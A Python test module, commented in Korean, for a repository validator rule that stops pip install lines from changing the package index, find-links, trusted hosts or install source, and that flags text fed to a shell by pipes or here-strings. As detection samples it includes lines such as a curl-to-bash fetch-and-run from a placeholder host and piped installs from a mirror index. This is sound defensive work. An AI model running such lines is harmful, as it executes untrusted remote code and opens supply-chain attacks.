"""DEP-3 확장 — 설치 줄이 패키지를 받아 오는 곳을 바꾸지 못하게 한다(의존성 고정 [M120] 독립 검증의 후속 제안, 운영자 확인 040 ① 승인 — 이슈 #271).

버전을 `-c` 로 정확히 묶어도 `--index-url`·`--extra-index-url`·`-f`(`--find-links`)·`--trusted-host` 로 다른 색인·링크 목록·신뢰 호스트를 가리키면 같은 이름·버전을 다른 곳에서 받는 길이 열린다.
그래서 `pip install` 줄(`install` 앞의 전역 옵션 포함)에 그 옵션이 있거나, 설치 대상이 주소·VCS·직접 참조(`git+…`·`://`·`이름@주소`)로 지정돼 있거나, `-e` 설치면 오류다.
값을 받는 전역 옵션 목록(`_DEP3_VALUE_OPTIONS` 등 — 진짜 pip 파서와 견주는 시험이 `test_dependency_constraints` 에 있다)은 건드리지 않고 그 위에 얹었다.

이 모듈이 보는 것: (1) 옵션 읽기 함수가 pip 가 받아 주는 모든 철자(줄임말·붙여 쓴 값·합친 짧은 옵션)를 찾고 무관한 옵션은 안 찾는다 — 진짜 pip 의 옵션 파서(접속 없음)와 대조 (2) 설치 대상 읽기
(3) 임시 폴더의 워크플로 설치 줄을 한 곳씩 틀리게 하면 DEP-3 오류로 잡히고 지금 저장소의 열 줄은 하나도 새로 거절되지 않는다 (4) 문서가 코드와 같은 말을 하고 못 막는 길을 정직하게 적었다
(5) 셸이 here-string·파이프로 받은 글을 실행하는 줄(안전 독립 검증 S 의 R3)과 설치 대상이 전부 주소인 줄의 -c 오류(N6). 진짜 pip 파서 시험은 CI 러너의 pip 가 22~26 어느 것이든 구조가 달라지면 경고를 남기고 건너뛴다(거짓 빨강 없음).
워크플로를 읽는 시험은 PyYAML 이 있어야 돈다(없는 환경에서는 건너뜀 — requirements-dev.txt 가 CI 에 설치한다).
"""
import contextlib
import io
import re
import sys
import tempfile
import types
import unittest
import warnings
from pathlib import Path
from unittest import mock

import _bootstrap

sys.path.insert(0, str(_bootstrap.ROOT / "scripts"))
import validate_repo as vr  # noqa: E402

try:
    import yaml
except ImportError:  # pragma: no cover - requirements-dev.txt 가 CI 에 설치한다
    yaml = None

ROOT = Path(_bootstrap.ROOT)
NEEDS_YAML = unittest.skipUnless(yaml is not None, "PyYAML(requirements-dev.txt)이 필요합니다(CI 에서는 항상 실행됩니다)")
CONSTRAINT_FILES = ("constraints-py310.txt", "constraints-py312.txt")
REQUIREMENT_FILES = ("requirements-dev.txt", "requirements-edits.txt", "requirements-pipeline.txt")
SOURCE_DESTS = ("index_url", "extra_index_urls", "find_links", "trusted_hosts")      # 진짜 pip 파서에서 '받아 오는 곳' 을 정하는 옵션의 이름(dest)
GOOD = "python -m pip install -c constraints-py312.txt -r requirements-edits.txt"


def read_bytes(rel):
    return (ROOT / rel).read_bytes().replace(b"\r\n", b"\n")


FILE_SOURCES = {rel: read_bytes(rel) for rel in REQUIREMENT_FILES + CONSTRAINT_FILES}


def source_names(args):
    return vr._dep3_source_options(args)


# ----------------------------------------------------------------------------
# 1) 옵션 읽기
# ----------------------------------------------------------------------------
class SourceOptionReaderTest(unittest.TestCase):
    FOUND = (
        (["--index-url", "u"], "--index-url"), (["--index-url=u"], "--index-url"), (["-i", "u"], "-i"), (["-iu"], "-i"), (["-ihttps"], "-i"),
        (["--pypi-url", "u"], "--pypi-url"), (["--pypi-url=u"], "--pypi-url"), (["--pypi", "u"], "--pypi"), (["--pyp=u"], "--pyp"), (["--pypi-u", "u"], "--pypi-u"),      # 옛 별칭(진짜 pip 파서에서 발견)
        (["--extra-index-url", "u"], "--extra-index-url"), (["--extra-index-url=u"], "--extra-index-url"),
        (["-f", "u"], "-f"), (["-fu"], "-f"), (["--find-links", "u"], "--find-links"), (["--find-links=u"], "--find-links"),
        (["--trusted-host", "h"], "--trusted-host"), (["--trusted-host=h"], "--trusted-host"),
        # pip(optparse)는 겹치지 않는 앞부분도 그 옵션으로 받아 준다
        (["--index", "u"], "--index"), (["--ind=u"], "--ind"), (["--index-u", "u"], "--index-u"), (["--extra-index", "u"], "--extra-index"), (["--extra-i", "u"], "--extra-i"),
        (["--find", "u"], "--find"), (["--fi=u"], "--fi"), (["--find-l", "u"], "--find-l"), (["--trusted", "h"], "--trusted"), (["--trust=h"], "--trust"), (["--trusted-h", "h"], "--trusted-h"),
        # 짧은 옵션을 합쳐 쓴다 — 앞의 글자가 값 없는 옵션이면 그다음 글자가 옵션이다
        (["-qi", "u"], "-i"), (["-Ui", "u"], "-i"), (["-qfu"], "-f"), (["-qUi", "u"], "-i"), (["-vvi", "u"], "-i"), (["-If", "u"], "-f"),
        # install 앞의 전역 위치와 다른 옵션 사이
        (["--trusted-host", "h", "install", "x"], "--trusted-host"), (["install", "-c", "c.txt", "-r", "r.txt", "--index-url", "u"], "--index-url"),
        (["install", "--upgrade", "pip", "-i", "u"], "-i"), (["--cache-dir", "cache", "install", "x", "--find-links", "dir"], "--find-links"),
    )
    CLEAN = (
        ["-r", "requirements.txt"], ["-rrequirements-dev.txt"], ["-r", "requirements-dev.txt"], ["-c", "constraints-py312.txt"], ["-cconstraints-py312.txt"], ["--constraint=constraints-py312.txt"],
        ["--constraint", "constraints-py312.txt"], ["--requirement=requirements-edits.txt"], ["-q"], ["-qU"], ["-v"], ["--no-cache-dir"], ["--upgrade", "pip"], ["-U", "pip"], ["--cache-dir", "cache", "install", "x"],
        ["--proxy", "p"], ["--target", "dir"], ["-t", "dir"], ["--progress-bar", "off"], ["--no-input"], ["--pre"], ["--user"], ["--require-hashes"], ["--no-index"], ["--no-deps"], ["--only-binary=:all:"],
        ["--python-version", "3.12"], ["--platform", "x"], ["--log", "list"], ["--quiet"], ["--disable-pip-version-check"], ["--timeout", "5"], ["--retries", "2"], ["--isolated"], ["--editable", "."],
        ["-rfoo-i"], ["-cfile-f"], ["-tdir-f"], ["google-genai>=2,<3"], ["pyyaml"], ["httpx>=0.27"], ["--"], ["-"], [], ["install"], ["install", "-r", "r.txt", "-c", "c.txt"],
    )

    def test_every_spelling_of_a_source_option_is_found_once_by_name(self):
        for args, name in self.FOUND:
            with self.subTest(args=args):
                self.assertEqual(source_names(args), [name])

    def test_options_that_only_look_alike_are_not_found(self):
        for args in self.CLEAN:
            with self.subTest(args=args):
                self.assertEqual(source_names(args), [])

    def test_several_source_options_on_one_line_are_all_reported_in_order(self):
        self.assertEqual(source_names(["-i", "a", "--extra-index-url=b", "-c", "c.txt", "--find-links", "d", "--trusted-host", "h"]), ["-i", "--extra-index-url", "--find-links", "--trusted-host"])

    def test_the_rest_of_a_combined_short_option_after_a_value_letter_is_that_options_value(self):
        for args in (["-rfi"], ["-cif"], ["-tfi"], ["-efi"], ["-Cif"]):
            self.assertEqual(source_names(args), [], args)

    def test_an_uppercase_or_longer_name_that_pip_would_reject_is_not_a_source_option(self):
        for args in (["--INDEX-URL", "u"], ["--index-url-x", "u"], ["--Find-Links", "u"], ["--no-find-links"], ["--index-urls", "u"]):
            self.assertEqual(source_names(args), [], args)


def pip_parser():
    """진짜 pip 의 `install` 옵션 파서(접속 없음) — 매번 새로 만든다(optparse 의 append 기본값이 파싱 사이에 새지 않게). 못 읽으면 None."""
    try:
        from pip._internal.commands import create_command
        return create_command("install").parser
    except Exception:       # pip 가 없거나 내부 구조가 다르다
        return None


KNOWN_SOURCE_NAMES = frozenset({"--index-url", "--pypi-url", "--extra-index-url", "--find-links", "--trusted-host", "-i", "-f"})


def real_source_names(parser):
    """진짜 파서에서 '받아 오는 곳' 을 정하는 옵션의 모든 철자(별칭 포함) → (긴 이름 목록, 짧은 이름 목록). 검증기의 목록을 빌리지 않는다. 구조를 못 읽으면 ([], [])."""
    try:
        options = list(parser.option_list) + [option for group in parser.option_groups for option in group.option_list]
        longs = [name for option in options if getattr(option, "dest", None) in SOURCE_DESTS for name in option._long_opts]
        shorts = [name for option in options if getattr(option, "dest", None) in SOURCE_DESTS for name in option._short_opts]
    except Exception:       # pip 가 옵션 파서를 다른 구조로 바꿨다
        return [], []
    return longs, shorts


def pip_sets_a_source(argv):
    """진짜 pip 가 argv 로 색인·링크·신뢰 호스트를 바꾸나: True/False, pip 가 거절하면(겹침·모르는 옵션) None. 기본값은 환경 변수·설정 파일이 정한 값과 견준다.
    pip 내부가 달라져 판정하지 못하면(예외·없어진 dest) 거짓 빨강 대신 None — 호출하는 시험은 그 후보를 건너뛴다(CI 러너의 pip 는 22~26 계열 어느 것이든 올 수 있다)."""
    try:
        baseline = pip_parser().parse_args([])[0]
        parser = pip_parser()
        with contextlib.redirect_stderr(io.StringIO()), contextlib.redirect_stdout(io.StringIO()):
            options, _args = parser.parse_args(list(argv))
    except SystemExit:
        return None
    except Exception:       # pip 내부가 달라 읽지 못함 — 판정하지 않는다
        return None
    return any(getattr(options, dest, None) != getattr(baseline, dest, None) for dest in SOURCE_DESTS)


def warn_drift(message):
    """pip 의 옵션 목록이 이 시험이 알던 것과 달라졌다 — 거짓 빨강 대신 경고를 남기고 건너뛴다(조용히 넘기지 않는다: 경고는 시험 출력에 남는다)."""
    warnings.warn(message, stacklevel=2)


class RealPipParserTest(unittest.TestCase):
    """진짜 pip 의 옵션 파서와 검증기의 읽기를 견준다 — 이 PC 에서 pip 22.0.4·23.2.1·26.2.2 로 돌려 같은 철자를 확인했다(긴 옵션 다섯·짧은 옵션 둘). CI 러너의 pip 가 달라도 거짓 빨강이 되지 않도록
    구조가 달라진 경우(옵션 이름·옵션 목록·후보 수)는 경고를 남기고 건너뛴다. 검증기의 읽기 자체가 틀린 경우(검증기가 아는 옵션의 철자를 놓침)만 빨강이다."""

    def setUp(self):
        parser = pip_parser()
        if parser is None:
            self.skipTest("pip 의 옵션 파서를 못 읽음(pip 가 없거나 내부 구조가 다르다) — 위의 고정 표가 대신 지킨다")
        longs, _shorts = real_source_names(parser)
        if not {"--index-url", "--extra-index-url", "--find-links", "--trusted-host"} <= set(longs):
            self.skipTest("이 pip 의 옵션 파서에서 색인·링크·신뢰 호스트 옵션을 알던 이름으로 찾지 못함(옵션 이름·구조가 바뀜) — 위의 고정 표가 대신 지킨다")

    def source_names_of_the_real_parser(self):
        """진짜 파서에서 '받아 오는 곳' 을 정하는 옵션의 모든 철자(별칭 포함) → (긴 이름 목록, 짧은 이름 목록). 검증기의 목록을 빌리지 않는다 — 목록에서 빠진 별칭이 있으면 여기서 걸린다."""
        return real_source_names(pip_parser())

    def candidates(self):
        """(인자 목록, 그 철자가 나온 진짜 옵션 이름) — 진짜 옵션 이름이 검증기가 아는 것인지로 '검증기의 읽기가 틀렸다' 와 'pip 가 새 별칭을 더했다' 를 가른다."""
        longs, shorts = self.source_names_of_the_real_parser()
        for name in longs:
            for size in range(3, len(name) + 1):
                prefix = name[:size]
                yield [prefix, "VALUE"], name
                yield [prefix + "=VALUE"], name
        for short in shorts:
            yield [short, "VALUE"], short
            yield [short + "VALUE"], short
            for flags in ("q", "U", "I", "qU", "vv"):
                yield [f"-{flags}{short[1]}", "VALUE"], short
                yield [f"-{flags}{short[1]}VALUE"], short

    @staticmethod
    def known_names():
        """pip 22.0.4·23.2.1·26.2.2 에서 같게 확인한 색인·링크·신뢰 호스트 옵션 철자 — 이 PC 에서 세 pip 의 옵션 파서를 직접 읽어 정했다. 검증기 목록과 따로 글자로 적는다(검증기 목록에서 빠지면 '오래된 철자가
        빠졌다' 는 빨강이고, 이 글에 없는 철자가 검증기 목록에 없는 것은 'pip 가 새 별칭을 더했다' 는 경고 뒤 건너뜀이다)."""
        return KNOWN_SOURCE_NAMES

    @staticmethod
    def validator_names():
        return set(vr._DEP3_SOURCE_LONG) | {"-" + letter for letter in vr._DEP3_SOURCE_SHORT}

    def test_every_spelling_pip_accepts_as_a_source_option_is_found_here(self):
        """pip 가 색인·링크·신뢰 호스트를 바꾸는 것으로 읽는 철자(줄임말·붙여 쓴 값·합친 짧은 옵션)를 하나도 놓치지 않는다 — pip 가 오류로 끝내는 철자(겹침)는 판정하지 않는다.
        놓친 철자가 검증기가 아는 옵션의 것이면 읽기의 결함이라 빨강이고, 검증기가 모르는 옵션 이름(pip 가 새로 더한 별칭)의 것이면 거짓 빨강 대신 경고를 남기고 건너뛴다."""
        accepted = 0
        drift = set()
        for argv, base in self.candidates():
            truth = pip_sets_a_source(argv)
            if truth is None:
                continue
            accepted += 1
            if truth and not source_names(argv):
                if base in self.known_names():
                    self.fail(f"pip 는 색인·링크를 바꾸는 줄로 읽는데 여기서는 못 찾은 철자: {argv}")
                drift.add(base)
        if accepted <= 40:                                                       # 비어서 통과하지 않는다 — 다만 pip 구조가 크게 달라 후보가 모자라면 판정할 수 없다
            warn_drift(f"진짜 pip 가 받아 준 후보가 {accepted}개뿐이라 비교하지 못했다(pip 의 옵션 파서 구조가 달라졌나)")
            self.skipTest("비교할 후보가 너무 적다")
        if drift:
            warn_drift(f"진짜 pip 가 받아 주는데 검증기 목록에 없는 옵션 이름 {sorted(drift)} — scripts/validate_repo.py 의 _DEP3_SOURCE_LONG/_DEP3_SOURCE_SHORT 에 더할지 본다")
            self.skipTest("pip 가 검증기가 모르는 새 별칭을 받아 준다(경고 참고)")

    def test_no_real_pip_option_name_that_is_not_a_source_option_is_found_here(self):
        """색인과 무관한 진짜 pip 옵션 이름은 하나도 '받아 오는 곳 옵션' 으로 읽히지 않는다. 오래 있던 이름이 읽히면 읽기의 결함이라 빨강이고, 이 pip 에서 이름이 처음 보이는 것(새 옵션이 우연히 줄임말 모양)이면 경고를 남기고 건너뛴다."""
        parser = pip_parser()
        options = list(parser.option_list) + [option for group in parser.option_groups for option in group.option_list]
        checked = 0
        collisions = []
        for option in options:
            if getattr(option, "dest", None) in SOURCE_DESTS:
                continue
            for name in list(option._long_opts) + list(option._short_opts):
                for args in ([name], [name, "VALUE"], [name + "=VALUE"] if name.startswith("--") else [name + "VALUE"]):
                    checked += 1
                    if source_names(args) != []:
                        collisions.append((option.dest, name, args))
        settled = [item for item in collisions if item[1] in self.long_standing_names()]
        self.assertEqual(settled, [], "오래 있던 pip 옵션 이름이 색인 옵션으로 읽힌다")
        if checked <= 100:
            warn_drift(f"비교한 진짜 옵션 철자가 {checked}개뿐이다(pip 의 옵션 파서 구조가 달라졌나)")
            self.skipTest("비교할 옵션이 너무 적다")
        if collisions:
            warn_drift(f"이 pip 에서 색인과 무관한 옵션 이름이 색인 옵션 줄임말 모양으로 읽힌다: {sorted({item[1] for item in collisions})}")
            self.skipTest("새 pip 옵션이 색인 옵션 줄임말과 겹친다(경고 참고)")

    @staticmethod
    def long_standing_names():
        """pip 22 부터 26 까지 이 PC 에서 같게 있던 색인과 무관한 옵션 이름 — 이것이 색인 옵션으로 읽히면 읽기의 결함이다."""
        return {"--no-index", "--no-deps", "--pre", "--user", "--target", "-t", "--upgrade", "-U", "--requirement", "-r", "--constraint", "-c", "--editable", "-e", "--no-cache-dir", "--quiet", "-q",
                "--verbose", "-v", "--timeout", "--retries", "--proxy", "--cert", "--client-cert", "--isolated", "--require-virtualenv", "--no-input", "--progress-bar", "--only-binary", "--no-binary",
                "--prefix", "--root", "--src", "--ignore-installed", "-I", "--force-reinstall", "--no-build-isolation", "--use-pep517", "--require-hashes", "--platform", "--python-version", "--implementation", "--abi"}

    def test_every_spelling_of_the_source_options_of_the_real_parser_is_listed_here_aliases_included(self):
        """진짜 파서의 색인·링크·신뢰 호스트 옵션 철자(별칭 `--pypi-url` 포함)가 하나도 빠짐없이 검증기 목록에 있다 — pip 가 새 별칭을 더하면 이 시험이 알린다(거짓 빨강 대신 경고를 남기고 건너뛴다 —
        CI 러너의 pip 가 올라도 무관한 변경이 빨개지지 않게). 한 방향만 본다: pip 가 철자를 없애도(목록이 더 넓어질 뿐 안전하다) 시험이 빨개지지 않는다."""
        longs, shorts = self.source_names_of_the_real_parser()
        self.assertGreaterEqual(len(longs), 4)                                   # 최소 `--index-url`·`--extra-index-url`·`--find-links`·`--trusted-host` 는 읽혔다(setUp 이 보장) — 비어서 통과하지 않는다
        missing = (set(longs) | set(shorts)) - self.validator_names()            # 진짜 파서에는 있는데 검증기 목록에 없는 철자
        self.assertEqual(sorted(missing & self.known_names()), [], "검증기 목록에서 빠진 오래된 철자(pip 22~26 모두에 있다)")
        new_aliases = sorted(missing - self.known_names())
        if new_aliases:
            warn_drift(f"진짜 pip 가 받아 주는데 검증기 목록에 없는 새 철자 {new_aliases} — scripts/validate_repo.py 의 _DEP3_SOURCE_LONG/_DEP3_SOURCE_SHORT 에 더할지 본다")
            self.skipTest("pip 가 검증기가 모르는 새 별칭을 받아 준다(경고 참고)")


class PipDriftToleranceTest(unittest.TestCase):
    """CI 러너의 pip 가 이 시험이 알던 것과 달라져도 거짓 빨강이 되지 않는지, 그러면서 검증기 쪽 결함은 여전히 빨강인지를 진짜 pip 파서를 흉내 내 바꿔서 직접 돌려 본다(시험 렌즈 Q 가 지적한 'CI 의 pip 버전 위험').
    이 PC 에서는 pip 22.0.4·23.2.1·26.2.2 에서 같은 철자(긴 다섯·짧은 둘)가 나왔다 — 그래도 24·25 계열이나 앞으로의 pip 가 달라질 수 있어 건너뜀 분기를 시험으로 못박는다."""

    MODULE = sys.modules[__name__]

    def setUp(self):
        if pip_parser() is None:
            self.skipTest("진짜 pip 의 옵션 파서를 못 읽음 — 흉내 낼 바탕이 없다")

    def outcome(self, name, patches=()):
        """`RealPipParserTest.<name>` 하나를 패치한 채 돌려 (건너뜀 수, 실패+오류 수, 경고 글 목록) 을 돌려준다."""
        result = unittest.TestResult()
        with warnings.catch_warnings(record=True) as caught, contextlib.ExitStack() as stack:
            warnings.simplefilter("always")
            for obj, attribute, value in patches:
                stack.enter_context(mock.patch.object(obj, attribute, value))
            unittest.TestSuite([RealPipParserTest(name)]).run(result)
        return len(result.skipped), len(result.failures) + len(result.errors), [str(item.message) for item in caught]

    def real_names_plus(self, *extra):
        real = real_source_names

        def fake(parser):
            longs, shorts = real(parser)
            return longs + list(extra), shorts
        return fake

    def test_a_new_alias_pip_added_is_a_warning_and_a_skip_not_a_red(self):
        real_sets = pip_sets_a_source
        patches = [(self.MODULE, "real_source_names", self.real_names_plus("--default-index")),
                   (self.MODULE, "pip_sets_a_source", lambda argv: True if argv[0].startswith("--def") else real_sets(argv))]       # 새 별칭은 pip 가 색인을 바꾸는 줄로 받아 준다고 흉내, 나머지는 진짜 pip
        skipped, bad, messages = self.outcome("test_every_spelling_of_the_source_options_of_the_real_parser_is_listed_here_aliases_included", patches)
        self.assertEqual((skipped, bad), (1, 0), messages)
        self.assertTrue(any("--default-index" in message for message in messages), messages)
        skipped, bad, messages = self.outcome("test_every_spelling_pip_accepts_as_a_source_option_is_found_here", patches)
        self.assertEqual((skipped, bad), (1, 0), messages)
        self.assertTrue(any("--default-index" in message for message in messages), messages)

    def test_an_old_spelling_missing_from_the_validator_list_is_still_a_red(self):
        for removed in ("--find-links", "--pypi-url", "--trusted-host"):
            with self.subTest(removed=removed):
                shorter = tuple(name for name in vr._DEP3_SOURCE_LONG if name != removed)
                patches = [(vr, "_DEP3_SOURCE_LONG", shorter)]
                for name in ("test_every_spelling_of_the_source_options_of_the_real_parser_is_listed_here_aliases_included", "test_every_spelling_pip_accepts_as_a_source_option_is_found_here"):
                    skipped, bad, messages = self.outcome(name, patches)
                    self.assertEqual((skipped, bad), (0, 1), (name, messages))

    def test_a_parser_whose_structure_changed_is_a_skip_in_every_test(self):
        class Broken:
            option_list = None                                           # `list(None)` 에서 예외 — 구조가 달라졌다
            option_groups = []
        for name in ("test_every_spelling_pip_accepts_as_a_source_option_is_found_here", "test_no_real_pip_option_name_that_is_not_a_source_option_is_found_here",
                     "test_every_spelling_of_the_source_options_of_the_real_parser_is_listed_here_aliases_included"):
            with self.subTest(name=name):
                skipped, bad, _messages = self.outcome(name, [(self.MODULE, "pip_parser", lambda: Broken())])
                self.assertEqual((skipped, bad), (1, 0), name)
        skipped, bad, _messages = self.outcome("test_every_spelling_pip_accepts_as_a_source_option_is_found_here", [(self.MODULE, "SOURCE_DESTS", ("renamed_index", "renamed_links"))])
        self.assertEqual((skipped, bad), (1, 0))                         # 옵션 이름(dest)이 바뀌어도 건너뜀

    def test_an_unrelated_new_option_that_looks_like_an_abbreviation_is_a_skip_but_an_old_one_is_a_red(self):
        collide = lambda args: ["x"] if args[0].startswith("--brand-new") else vr._dep3_source_options(args)       # 새 옵션 이름이 줄임말 모양으로 읽힌다고 흉내
        extra = types.SimpleNamespace(dest="brand_new", _long_opts=["--brand-new"], _short_opts=[])
        real = pip_parser()
        real.option_list.append(extra)
        skipped, bad, messages = self.outcome("test_no_real_pip_option_name_that_is_not_a_source_option_is_found_here",
                                              [(self.MODULE, "pip_parser", lambda: real), (self.MODULE, "source_names", collide)])
        self.assertEqual((skipped, bad), (1, 0), messages)
        self.assertTrue(any("--brand-new" in message for message in messages), messages)
        old = lambda args: ["x"] if args[0] == "--no-index" else vr._dep3_source_options(args)                    # 오래 있던 이름이 읽히면 읽기의 결함
        skipped, bad, _messages = self.outcome("test_no_real_pip_option_name_that_is_not_a_source_option_is_found_here", [(self.MODULE, "source_names", old)])
        self.assertEqual((skipped, bad), (0, 1))

    def test_with_the_real_pip_of_this_python_all_three_real_parser_tests_run_or_skip_cleanly(self):
        for name in ("test_every_spelling_pip_accepts_as_a_source_option_is_found_here", "test_no_real_pip_option_name_that_is_not_a_source_option_is_found_here",
                     "test_every_spelling_of_the_source_options_of_the_real_parser_is_listed_here_aliases_included"):
            skipped, bad, messages = self.outcome(name)
            self.assertEqual(bad, 0, (name, messages))


# ----------------------------------------------------------------------------
# 2) 설치 대상 읽기
# ----------------------------------------------------------------------------
class SourceSpecTest(unittest.TestCase):
    def test_addresses_vcs_and_direct_references_are_source_specs(self):
        for spec in ("git+https://example.invalid/x.git", "git+ssh://example.invalid/x.git@v1", "GIT+https://example.invalid/x.git", "hg+https://example.invalid/x", "svn+https://example.invalid/x",
                     "bzr+https://example.invalid/x", "https://example.invalid/x-1.0.whl", "http://example.invalid/x.tar.gz", "file:///tmp/x.whl", "ftp://example.invalid/x.zip",
                     "pkg@https://example.invalid/pkg.whl", "pkg@git+https://example.invalid/pkg.git", "pkg@file:./pkg.whl", "@", "pkg @ https://example.invalid/x.whl",
                     "git+file:/tmp/x", "hg+file:/tmp/x", "svn+file:/tmp/x", "bzr+file:/tmp/x", "Git+file:/tmp/x"):               # 앞의 넷은 `://` 도 `@` 도 없어 VCS 접두사만으로 잡힌다
            with self.subTest(spec=spec):
                self.assertTrue(vr._dep3_source_spec(spec))

    def test_ordinary_requirements_are_not(self):
        for spec in ("google-genai>=2,<3", "pyyaml", "PyYAML==6.0.2", "httpx>=0.27", "pip", "actionlint-py==1.7.12.25", "requests[security]>=2", "a-b_c.d", "git-lfs", "hgtools>=1"):
            with self.subTest(spec=spec):
                self.assertFalse(vr._dep3_source_spec(spec))


# ----------------------------------------------------------------------------
# 2b) 셸이 입력(here-string·파이프)으로 받은 글을 실행하는 줄 — 설치 줄을 따옴표 글에 담아 셸에 먹이는 길(독립 검증 S 의 R3)
# ----------------------------------------------------------------------------
HIDDEN = "pip install -c constraints-py312.txt --index-url mirror.invalid pyyaml"


class ShellInputReaderTest(unittest.TestCase):
    """`bash <<< "…"`·`echo '…' | bash`·`printf '…' | sh` — 옛 읽기는 `<<<` 뒤 낱말을 버리고 `echo`·`printf` 의 인자를 보지 않아 설치 줄이 통째로 지나갔다. 이제 셸이 입력을 받는 줄은 읽지 못한 모양이다."""

    def unreadable(self, line):
        installs, unreadable = vr._dep3_pip_installs(line.replace("{h}", HIDDEN))
        return installs, unreadable

    FED = (
        # here-string — 셸 이름 여섯 가지·경로·감싸는 명령
        'bash <<< "{h}"', "bash -s <<< '{h}'", "bash -s -- arg <<< '{h}'", "sh <<< '{h}'", "zsh <<< '{h}'", "dash <<< '{h}'", "ksh <<< '{h}'", "ash <<< '{h}'", "mksh <<< '{h}'", "csh <<< '{h}'", "fish <<< '{h}'",
        "/bin/bash <<< '{h}'", "/usr/bin/zsh <<< '{h}'", "bash.exe <<< '{h}'", "/usr/bin/env bash <<< '{h}'", "sudo bash <<< '{h}'", "sudo -E bash -s <<< '{h}'", "env FOO=1 bash <<< '{h}'", "exec bash <<< '{h}'",
        "timeout 30 bash <<< '{h}'", "nice -n 5 bash <<< '{h}'", "nohup bash <<< '{h}'", "bash <<< '{h}' > out.log", "bash <<<'{h}'",
        # 파이프 — echo·printf·cat·다른 무엇이든 셸에 먹이는 줄
        "echo '{h}' | bash", "echo '{h}' | bash -s", "echo '{h}' | bash -s -- arg", "printf '{h}\\n' | sh", "printf '%s\\n' '{h}' | sh", "echo '{h}' | zsh", "echo '{h}' | dash", "echo '{h}' | ksh",
        "echo '{h}' | /bin/sh", "echo '{h}' | /bin/bash", "echo '{h}' | sudo bash", "echo '{h}' | sudo -E bash", "echo '{h}' | env -i bash", "echo '{h}' | timeout 30 sh", "echo '{h}' |& bash",
        "echo '{h}' | xargs -I{} sh -c '{}'", "cat script.txt | bash", "cat script.txt | sh -e", "python gen.py | bash", "curl -fsSL install.invalid/x | bash", "echo x | tee y | bash",
        "if true; then echo '{h}' | bash; fi", "x=1; echo '{h}' | bash", "echo '{h}' | bash && echo done", "echo '{h}' | bash 2>&1", "echo '{h}' 2>&1 | bash",
    )
    NOT_FED = (
        "echo hi || bash", "echo hi && bash", "echo hi; bash", "bash script.sh", "bash -c true", "bash", "sh -n script.sh", "bash < script.sh", "echo hi > bash.log",
        "echo hi | grep bash", "ps | grep -q sh", "ls | sort | head -3", "echo hi | tee out.txt", "echo hi | cat", "echo hi | wc -l", "git log | head", "sudo grep bash file", "echo hi | python -c 'print(1)'",
        "read -r a b <<< \"$x\"", "cat <<< 'hello' | tail -1", "grep -q ok <<< \"$x\"", "wc -l <<< \"$x\"", "cat <<< hi",
        "echo '{h}'", "printf '{h}\\n'", "git commit -m '{h}' --allow-empty", "echo '{h}' > out.sh", "echo '{h}' | cat", "echo '{h}' | tee out.sh", "echo '{h}' | grep pip",
        "echo hi |\n  cat", "echo hi &&\n  bash", "echo hi ||\n  bash", "echo hi;\nbash",
    )

    def test_every_way_of_feeding_a_shell_is_one_unreadable_error_and_hides_no_install(self):
        for line in self.FED:
            with self.subTest(line=line):
                installs, unreadable = self.unreadable(line)
                self.assertEqual(len(unreadable), 1, unreadable)
                self.assertIn("셸이 실행하는 줄", unreadable[0])
                self.assertIn("읽지 못하는 모양", unreadable[0])
                self.assertEqual(installs, [])
                for text in (unreadable[0],):
                    self.assertEqual(len(text.splitlines()), 1, text)
                    self.assertNotIn("::", text)

    def test_lines_that_do_not_feed_a_shell_are_not_flagged(self):
        for line in self.NOT_FED:
            with self.subTest(line=line):
                installs, unreadable = self.unreadable(line)
                self.assertEqual(unreadable, [], line)

    def test_a_pipeline_that_continues_on_the_next_line_still_feeds_the_shell(self):
        for run in ("echo '{h}' |\n  bash", "echo '{h}' |\n# a comment between\n  bash", "echo '{h}' |\n\n  sh -s", "echo '{h}' | \\\n  bash", "cat x |&\n bash", "echo '{h}' |\n  sudo bash"):
            with self.subTest(run=run):
                self.assertEqual(len(self.unreadable(run)[1]), 1, run)
        installs, unreadable = self.unreadable("echo hi |\n  cat\nbash script.sh")                      # 이음은 한 줄만 간다
        self.assertEqual(unreadable, [])

    def test_the_here_string_text_is_read_like_an_argument_of_any_other_command(self):
        """`<<<` 의 글을 버리지 않는다: `echo`·`printf`·`git`·`gh` 가 아닌 명령의 here-string 글에 pip install 이 들어 있으면 인자에 든 것과 같게 읽지 못한 설치다(문서의 grep 예와 같다)."""
        for line in ("grep -q 'pip install' <<< \"$x\"", "python - <<< 'pip install -i mirror.invalid pyyaml'", "read -r a <<< 'pip install x'", "xargs echo <<< 'pip install x'", "cat <<< 'python -m pip install x'"):
            with self.subTest(line=line):
                installs, unreadable = self.unreadable(line)
                self.assertEqual(len(unreadable), 1, unreadable)
                self.assertIn("안에 pip install 이 들어 있습니다", unreadable[0])
        for line in ("echo 'pip install x' <<< y", "printf 'pip install x' <<< y", "git commit -m 'pip install x' <<< y", "wc -l <<< 'no install here'"):
            with self.subTest(line=line):
                self.assertEqual(self.unreadable(line)[1], [], line)

    def test_a_here_string_or_pipe_is_not_what_makes_a_plain_pip_line_unreadable(self):
        installs, unreadable = self.unreadable(GOOD + " 2>&1 | tail -3")
        self.assertEqual((len(installs), unreadable), (1, []))
        installs, unreadable = self.unreadable("echo ok | tee x.log\n" + GOOD)
        self.assertEqual((len(installs), unreadable), (1, []))

    def test_the_shell_name_is_found_after_wrappers_and_not_among_the_arguments_of_other_commands(self):
        for words, expected in ((["bash"], True), (["sh", "-e"], True), (["/bin/sh"], True), (["BASH"], False), (["sudo", "bash"], True), (["sudo", "-E", "bash", "-s"], True), (["env", "-i", "FOO=1", "bash"], True),
                                (["timeout", "30", "bash"], True), (["nice", "-n", "5", "sh"], True), (["xargs", "-I{}", "sh", "-c", "{}"], True), (["busybox", "sh"], True), (["exec", "bash"], True),
                                (["grep", "bash"], False), (["cat", "sh"], False), (["ls"], False), ([], False), (["sudo"], False), (["sudo", "grep", "bash"], False), (["tee", "bash.log"], False),
                                (["bashful"], False), (["shellcheck", "x"], False), (["python", "bash"], False)):
            with self.subTest(words=words):
                self.assertEqual(vr._dep3_is_shell_command(words), expected, words)

    def test_the_documented_limit_a_wrapper_option_with_a_value_hides_the_shell(self):
        """문서(§3 (h))가 '못 막는다' 고 적은 모양 — 감싸는 명령의 옵션에 값이 끼면(`sudo -u user bash`) 셸을 못 찾는다. 막는 변경이 생기면 이 시험과 문서를 함께 고친다."""
        self.assertFalse(vr._dep3_is_shell_command(["sudo", "-u", "root", "bash"]))
        self.assertFalse(vr._dep3_is_shell_command(["env", "-C", "dir", "bash"]))
